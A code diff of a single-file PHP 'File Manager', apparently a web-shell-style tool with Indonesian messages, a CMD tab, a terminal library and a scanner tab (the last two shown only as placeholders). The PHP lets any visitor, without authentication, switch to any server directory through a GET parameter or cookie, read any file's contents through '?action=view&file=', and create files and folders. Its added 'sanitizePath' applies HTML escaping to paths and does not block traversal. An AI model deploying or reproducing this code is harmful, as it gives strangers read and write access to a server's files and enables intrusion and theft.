@@ -10,119 +10,109 @@ function getCookieDir() {
     return isset($_COOKIE['current_dir']) ? $_COOKIE['current_dir'] : getcwd();
 }
 
+function sanitizePath($path) {
+    return str_replace("\\", "/", htmlspecialchars($path));
+}
+
 function path() {
-    $dir = isset($_GET['dir']) ? $_GET['dir'] : getCookieDir();
-    $dir = str_replace("\\", "/", $dir);
-    @chdir($dir);
-    setCookieDir($dir);
+    $dir = isset($_GET['dir']) ? sanitizePath($_GET['dir']) : getCookieDir();
+    $dir = realpath($dir);
+    
+    if ($dir && is_dir($dir)) {
+        chdir($dir);
+        setCookieDir($dir);
+    } else {
+        $dir = getcwd();
+    }
+
     return $dir;
 }
 
 function renderFileList($dir) {
-    // Pastikan direktori yang diberikan valid
     if (!is_dir($dir)) {
         return "<p>Direktori tidak ditemukan: " . htmlspecialchars($dir) . "</p>";
     }
 
-    // Fungsi untuk mendapatkan path direktori parent
     function parentDir($dir) {
-        $parentPath = dirname($dir);
-        return realpath($parentPath) ?: $parentPath;
+        return realpath(dirname($dir)) ?: $dir;
     }
 
-    // Fungsi untuk mendapatkan permissions file
-    function perms($path) {
-        $perms = fileperms($path);
-        if (($perms & 0xC000) === 0xC000) return 's'; // Socket
-        if (($perms & 0xA000) === 0xA000) return 'l'; // Link
-        if (($perms & 0x8000) === 0x8000) return 'f'; // Regular
-        if (($perms & 0x6000) === 0x6000) return 'b'; // Block
-        if (($perms & 0x4000) === 0x4000) return 'd'; // Directory
-        if (($perms & 0x2000) === 0x2000) return 'c'; // Character
-        if (($perms & 0x1000) === 0x1000) return 'p'; // FIFO
-        return 'u'; // Unknown
+    function getFileInfo($path) {
+        return [
+            'name' => basename($path),
+            'path' => $path,
+            'owner' => fileowner($path),
+            'group' => filegroup($path),
+            'perms' => substr(decoct(fileperms($path) & 0777), -3),
+            'modification_date' => date("Y-m-d H:i:s", filemtime($path))
+        ];
     }
 
-    // Mengambil semua item di direktori
-    $items = scandir($dir);
+    $items = array_diff(scandir($dir), ['.', '..']);
+    $parentPath = ($dir !== '/') ? parentDir($dir) : null;
+
     $directories = [];
     $files = [];
 
-    // Tambahkan direktori parent jika bukan root directory
-    if ($dir !== '/') {
-        $parentPath = parentDir($dir);
-        $directories[] = [
-            'name' => '..',
-            'path' => $parentPath,
+    if ($parentPath) {
+        $directories[] = array_merge(getFileInfo($parentPath), [
             'type' => 'dir',
-            'owner' => fileowner($parentPath),
-            'group' => filegroup($parentPath),
-            'perms' => perms($parentPath),
-            'modification_date' => date("Y-m-d H:i:s", filemtime($parentPath)),
-            'link' => "<a href='#' class='dir-link' data-dir='" . htmlspecialchars($parentPath) . "'>..</a>"
-        ];
+            'link' => "<a href='#' class='dir-link' data-dir='" . sanitizePath($parentPath) . "'>..</a>"
+        ]);
     }
 
-    // Mengorganisir item ke dalam direktori dan file
     foreach ($items as $item) {
-        if ($item == "." || $item == "..") continue;
-
         $itemPath = $dir . DIRECTORY_SEPARATOR . $item;
-        $info = [
-            'name' => $item,
-            'path' => $itemPath,
-            'owner' => fileowner($itemPath),
-            'group' => filegroup($itemPath),
-            'perms' => perms($itemPath),
-            'modification_date' => date("Y-m-d H:i:s", filemtime($itemPath)),
-            'link' => is_dir($itemPath) ? "<a href='#' class='dir-link' data-dir='" . htmlspecialchars($itemPath) . "'>$item</a>" : "<a href='#' class='file-link' data-file='" . htmlspecialchars($itemPath) . "'>$item</a>"
-        ];
+        $info = array_merge(getFileInfo($itemPath), ['link' => is_dir($itemPath) ? "<a href='#' class='dir-link' data-dir='" . sanitizePath($itemPath) . "'>$item</a>" : "<a href='#' class='file-link' data-file='" . sanitizePath($itemPath) . "'>$item</a>"]);
 
         if (is_dir($itemPath)) {
-            $directories[] = array_merge($info, ['type' => 'dir']);
+            $info['type'] = 'dir';
+            $directories[] = $info;
         } elseif (is_file($itemPath)) {
-            $files[] = array_merge($info, ['type' => 'file']);
+            $info['type'] = 'file';
+            $files[] = $info;
         }
     }
 
-    // Menghasilkan HTML untuk direktori dan file
-    $html = "<div class='directories'><h3>Directories</h3><ul>";
+    $html = "<table class='table'><thead><tr><th>Name</th><th>Type</th><th>Owner</th><th>Group</th><th>Permissions</th><th>Modification Date</th></tr></thead><tbody>";
+
     foreach ($directories as $dir) {
-        $html .= "<li>{$dir['link']}</li>";
+        $html .= "<tr><td>{$dir['link']}</td><td>Directory</td><td>{$dir['owner']}</td><td>{$dir['group']}</td><td>{$dir['perms']}</td><td>{$dir['modification_date']}</td></tr>";
     }
-    $html .= "</ul></div><div class='files'><h3>Files</h3><ul>";
+
     foreach ($files as $file) {
-        $html .= "<li>{$file['link']}</li>";
+        $html .= "<tr><td>{$file['link']}</td><td>File</td><td>{$file['owner']}</td><td>{$file['group']}</td><td>{$file['perms']}</td><td>{$file['modification_date']}</td></tr>";
     }
-    $html .= "</ul></div>";
+
+    $html .= "</tbody></table>";
 
     return $html;
 }
 
-
 $dir = path();
 
-if (isset($_GET['dir'])) {
-    echo renderFileList($dir);
-    exit();
-} elseif (isset($_GET['action'])) {
+if (isset($_GET['action'])) {
     switch ($_GET['action']) {
         case 'create_folder':
             if (isset($_POST['folder_name'])) {
-                $folderName = $_POST['folder_name'];
+                $folderName = sanitizePath($_POST['folder_name']);
                 $newFolderPath = $dir . DIRECTORY_SEPARATOR . $folderName;
                 if (!file_exists($newFolderPath)) {
                     mkdir($newFolderPath);
+                } else {
+                    echo "Folder sudah ada.";
                 }
             }
             break;
 
         case 'create_file':
             if (isset($_POST['file_name'])) {
-                $fileName = $_POST['file_name'];
+                $fileName = sanitizePath($_POST['file_name']);
                 $newFilePath = $dir . DIRECTORY_SEPARATOR . $fileName;
                 if (!file_exists($newFilePath)) {
                     touch($newFilePath);
+                } else {
+                    echo "File sudah ada.";
                 }
             }
             break;
@@ -137,9 +127,9 @@ if (isset($_GET['dir'])) {
 
         case 'view':
             if (isset($_GET['file'])) {
-                $file = $_GET['file'];
-                $content = file_get_contents($file);
-                if ($content !== false) {
+                $file = sanitizePath($_GET['file']);
+                if (file_exists($file)) {
+                    $content = file_get_contents($file);
                     echo "<p>File Contents: " . htmlspecialchars($file) . "</p>";
                     echo '<pre>' . htmlspecialchars($content) . '</pre>';
                 } else {
@@ -151,227 +141,299 @@ if (isset($_GET['dir'])) {
     exit();
 }
 
-// Render initial file list
-echo renderFileList($dir);
-?>
+if (isset($_GET['dir'])) {
+    echo renderFileList($dir);
+    exit();
+}
 
+$fileListHtml = renderFileList($dir);
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
+<meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>File Manager</title>
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/jquery.terminal/js/jquery.terminal.min.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery.terminal/css/jquery.terminal.min.css"/>
     <style>
-        body {
-    font-family: 'Courier New', Courier, monospace;
-    background-color: #121212;
-    color: #e0e0e0;
-}
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
 
-.sidebar-header h3 {
-    color: #00ff00;
-}
-
-.navbar, .modal-header {
-    background-color: #1e1e1e;
-}
-
-.modal-content {
-    background-color: #2e2e2e;
-    border: 1px solid #00ff00;
-}
-
-.modal-body {
-    color: #e0e0e0;
-}
-
-.list-unstyled a {
-    color: #00ff00;
-}
-
-.list-unstyled a:hover {
-    color: #ff00ff;
-}
-
-h2 {
-    color: #00ff00;
-}
-
-#file-list {
-    border: 1px solid #00ff00;
-    border-radius: 5px;
+body {
+    background: linear-gradient(135deg, #0d0d0d, #1a1a1a);
+    color: #fff;
+    font-family: 'Orbitron', sans-serif;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
     padding: 15px;
-    margin-top: 20px;
+}
+::-webkit-scrollbar {
+    width: 8px;
 }
 
+::-webkit-scrollbar-thumb {
+    background-color: #0ff; /* Scrollbar color */
+    border-radius: 5px;
+}
+
+::-webkit-scrollbar-thumb::horizontal {
+    background-color: #0ff; /* Scrollbar color */
+    border-radius: 5px;
+}
+
+.container {
+    max-width: 90%; /* Increased width */
+    background: rgba(20, 20, 20, 0.9);
+    border-radius: 15px;
+    box-shadow: 0 4px 15px rgba(0, 255, 255, 0.5);
+    padding: 20px; /* Reduced padding */
+    border: 1px solid #0ff;
+}
+a {
+    color: #0ff;
+    text-decoration: none !important;
+}
+
+a:hover {
+    color:#00e5e5; 
+    text-decoration: none !important;
+    cursor:pointer;  
+}
+
+.btn {
+    color: #fff;
+    font-size: 12px;
+    background-color: transparent;
+    border: 1px dashed #0ff;
+}
+
+.btn:hover {
+    color: #0ff;
+}
+
+.header {
+    text-align: center;
+    margin-bottom: 10px; /* Reduced margin */
+}
+.nav-pills .nav-link {
+    border-radius: 10px;
+    margin: 0 5px;
+    color: #0ff;
+    background: rgba(255, 255, 255, 0.1);
+    border: 1px solid transparent;
+    transition: background 0.3s, color 0.3s, border 0.3s;
+    font-size: 12px;
+}
+.nav-pills .nav-link.active {
+    color: #0d0d0d;
+    background: #0ff;
+    border-color: #0ff;
+}
+.nav-pills .nav-link:hover {
+    color: #0d0d0d;
+    background: rgba(0, 255, 255, 0.2);
+    border-color: #0ff;
+}
+.tab-content {
+    background: rgba(20, 20, 20, 0.9);
+    border-radius: 10px;
+    box-shadow: 0 4px 15px rgba(0, 255, 255, 0.5);
+    padding: 20px; /* Reduced padding */
+    border: 1px dashed #0ff;
+}
+.tab-pane {
+    min-height: 300px;
+}
+.info-section {
+    margin-top: 20px; /* Reduced margin */
+    padding: 20px; /* Reduced padding */
+    background: rgba(20, 20, 20, 0.9);
+    border-radius: 10px;
+    box-shadow: 0 4px 15px rgba(0, 255, 255, 0.5);
+    border: 1px dashed #0ff;
+    color: #0ff;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+.info-section .info-item {
+    padding: 10px; /* Reduced padding */
+    border: 1px dashed #0ff;
+    border-radius: 10px;
+    box-shadow: 0 4px 10px rgba(0, 255, 255, 0.5);
+    margin-bottom: 10px; /* Reduced margin */
+    width: 100%;
+    text-align: left;
+    background: rgba(0, 255, 255, 0.1);
+    font-size: 12px;
+    color: #fff;
+}
+.info-section .info-item:last-child {
+    margin-bottom: 0;
+}
 .table {
-    color: #e0e0e0;
-    border-color: #00ff00;
+    background: rgba(20, 20, 20, 0.9);
+    color: #0ff;
+    border-collapse: separate;
+    border-spacing: 0;
+}
+
+.table th, .table td {
+    border: 1px solid #0ff; /* Set border color */
+    padding: 10px; /* Adjust padding if needed */
+}
+
+.table thead {
+    background: rgba(0, 255, 255, 0.2); /* Lighter background for header */
 }
 
 .table thead th {
-    background-color: #1e1e1e;
+    color: #0d0d0d; /* Darker color for header text */
+    font-weight: bold;
 }
 
 .table tbody tr:nth-child(even) {
-    background-color: #2e2e2e;
+    background: rgba(0, 255, 255, 0.05); /* Slightly different background for even rows */
 }
 
-.table tbody tr:hover {
-    background-color: #3e3e3e;
+.table tbody tr:nth-child(odd) {
+    background: rgba(20, 20, 20, 0.9); /* Darker background for odd rows */
 }
 
-@media (max-width: 767px) {
-    #sidebar {
-        position: relative;
-        height: auto;
-        width: 100%;
-    }
-    #sidebar ul {
-        display: flex;
-        flex-direction: row;
-        justify-content: space-around;
-    }
+.table tbody td {
+    color: #0ff; /* Set text color for table body */
+}
+.modal-content {
+    background: #0d0d0d;
+    color: #fff;
+    border: 1px solid #0ff;
+    border-radius: 10px;
+}
+.modal-header, .modal-footer {
+    border-bottom: none;
+    border-top: none;
+}
+.modal-header {
+    background: rgba(0, 255, 255, 0.1);
+}
+.modal-footer {
+    background: rgba(255, 255, 255, 0.1);
+}
+.modal-body {
+    background: rgba(0, 0, 0, 0.7);
+}
+.modal-title {
+    color: #0ff;
+}
+.terminal {
+    background-color: black;
+    color: #0ff; /* Bright green text color */
+    font-family: 'Courier New', Courier, monospace;
+    font-size: 14px;
+    line-height: 1.5;
+    padding: 20px;
+    margin: 0 auto;
+    height: 600px;
+    word-wrap: break-word;
+    border: 1px solid #0ff; /* Optional border for better definition */
+    border-radius: 5px; /* Optional rounded corners */
+    border: 1px dashed #0ff;
+}
+
+.terminal-content {
+    height: 100%;
+    overflow-y: auto;
+}
+
+.terminal-form {
+    display: flex;
+    flex-direction: column;
+}
+
+.terminal-content::-webkit-scrollbar {
+    width: 8px;
+}
+
+.terminal-content::-webkit-scrollbar-thumb {
+    background-color: #0ff; /* Scrollbar color */
+    border-radius: 5px;
+}
+.terminal-prompt {
+    color: #0ff; /* Prompt text color */
+    margin-right: 10px; /* Space between prompt and input field */
+    white-space: nowrap; /* Prevents prompt from wrapping */
+}
+
+.terminal-input {
+    border: none;
+    background: transparent;
+    color: #c5c5c5; /* Light gray text for input */
+    font-family: 'Courier New', Courier, monospace;
+    font-size: 14px;
+    outline: none;
+    flex: 1; /* Allows input to take remaining space */
+    padding: 0;
+    margin: 0;
+    box-sizing: border-box; /* Includes padding in width calculation */
+    width: 50%;
+}
+
+.terminal-input::placeholder {
+    color: #666; /* Placeholder text color */
 }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1 class="header">File Manager</h1>
-    <ul class="nav nav-pills mb-3" id="pills-tab" role="tablist">
-        <li class="nav-item" role="presentation">
-            <button class="nav-link active" id="explorer-tab" data-toggle="pill" data-target="#explorer" type="button" role="tab" aria-controls="explorer" aria-selected="true">Home</button>
-        </li>
-        <li class="nav-item" role="presentation">
-            <button class="nav-link" id="cmd-tab" data-toggle="pill" data-target="#cmd" type="button" role="tab" aria-controls="cmd" aria-selected="false">CMD</button>
-        </li>
-        <li class="nav-item" role="presentation">
-            <button class="nav-link" id="tools-tab" data-toggle="pill" data-target="#tools" type="button" role="tab" aria-controls="tools" aria-selected="false">Tools</button>
-        </li>
-    </ul>
+    <h2 class="text-center mb-4">PHP File Manager</h2>
+    <!-- Your existing navigation and form code -->
 
     <div class="info-section mb-4">
-        <!-- Info section here -->
+        <div class="info-item">Info:</div>
+        <div class="info-item">Info:</div>
+        <div class="info-item">Current Directory : <span id="current-dir"><?php echo htmlspecialchars($dir); ?></span></div>
     </div>
 
-    <div class="file-manager">
-        <div id="file-list"></div>
-    </div>
-
-    <div class="mb-3">
-        <a href="javascript:void(0);" onclick="show('xnewfolder')" class="text-success">[ New Folder ]</a>
-        <a href="javascript:void(0);" onclick="show('xnewfile')" class="text-success">[ New File ]</a>
-        <a href="javascript:void(0);" onclick="show('xnewupload')" class="text-success">[ Upload ]</a>
-    </div>
-
-    <div id="xnewfolder" class="mb-3" style="display:none;">
-        <form id="create-folder-form">
-            <div class="form-group">
-                <label for="folder-name">Folder Name:</label>
-                <input type="text" class="form-control" id="folder-name" name="folder_name" required>
+    <div class="tab-content" id="pills-tabContent">
+        <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
+            <div id="file-list">
+                <?php echo $fileListHtml; ?>
             </div>
-            <button type="submit" class="btn btn-primary">Create Folder</button>
-        </form>
-    </div>
-    <div id="xnewfile" class="mb-3" style="display:none;">
-        <form id="create-file-form">
-            <div class="form-group">
-                <label for="file-name">File Name:</label>
-                <input type="text" class="form-control" id="file-name" name="file_name" required>
-            </div>
-            <button type="submit" class="btn btn-primary">Create File</button>
-        </form>
-    </div>
-    <div id="xnewupload" class="mb-3" style="display:none;">
-        <form id="upload-form" enctype="multipart/form-data">
-            <div class="form-group">
-                <label for="upload-file">Upload File:</label>
-                <input type="file" class="form-control" id="upload-file" name="upload_file" required>
-            </div>
-            <button type="submit" class="btn btn-primary">Upload</button>
-        </form>
+        </div>
+        <div class="tab-pane fade" id="cmd" role="tabpanel" aria-labelledby="cmd-tab">...</div>
+        <div class="tab-pane fade" id="scanner" role="tabpanel" aria-labelledby="scanner-tab">...</div>
     </div>
 </div>
 
-<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
 <script>
-$(document).ready(function() {
-    function loadDirectory(dir) {
-        $.get('', { dir: dir }, function(data) {
-            $('#file-list').html(data);
+    $(document).ready(function() {
+        // Event delegation for directory and file links
+        $(document).on('click', '.dir-link', function(event) {
+            event.preventDefault();
+            var dir = $(this).data('dir');
+            $.get('?dir=' + encodeURIComponent(dir), function(data) {
+                $('#file-list').html(data);
+                $('#current-dir').text(dir);
+            }).fail(function() {
+                alert('Failed to load directory.');
+            });
         });
-    }
 
-    $(document).on('click', '.dir-link', function() {
-        const dir = $(this).data('dir');
-        loadDirectory(dir);
-    });
-
-    $(document).on('click', '.file-link', function() {
-        const file = $(this).data('file');
-        $.get('', { action: 'view', file: file }, function(data) {
-            $('#file-list').html(data);
-        });
-    });
-
-    $('#create-folder-form').on('submit', function(event) {
-        event.preventDefault();
-        $.post('', $(this).serialize() + '&action=create_folder', function(data) {
-            loadDirectory('');
+        $(document).on('click', '.file-link', function(event) {
+            event.preventDefault();
+            var file = $(this).data('file');
+            $.get('?action=view&file=' + encodeURIComponent(file), function(data) {
+                alert(data);
+            }).fail(function() {
+                alert('Failed to load file.');
+            });
         });
     });
-
-    $('#create-file-form').on('submit', function(event) {
-        event.preventDefault();
-        $.post('', $(this).serialize() + '&action=create_file', function(data) {
-            loadDirectory('');
-        });
-    });
-
-    $('#upload-form').on('submit', function(event) {
-        event.preventDefault();
-        $.ajax({
-            url: '',
-            type: 'POST',
-            data: new FormData(this),
-            processData: false,
-            contentType: false,
-            success: function(data) {
-                loadDirectory('');
-            }
-        });
-    });
-
-    // Initial load
-    loadDirectory('');
-});
-
-function show(id) {
-    document.getElementById(id).style.display = 'block';
-}
-document.addEventListener('DOMContentLoaded', function() {
-    // Example function to handle file creation
-    document.getElementById('create-file-form').addEventListener('submit', function(e) {
-        e.preventDefault();
-        const fileName = document.getElementById('file-name').value;
-        // AJAX call to create the file
-        console.log('Creating file:', fileName);
-        // Your AJAX logic here
-    });
-
-    // Example function to update file list
-    function updateFileList() {
-        // AJAX call to fetch and display the list of files
-        console.log('Fetching file list');
-        // Your AJAX logic here
-    }
-
-    // Call updateFileList on page load
-    updateFileList();
-});
-
 </script>
 </body>
 </html>
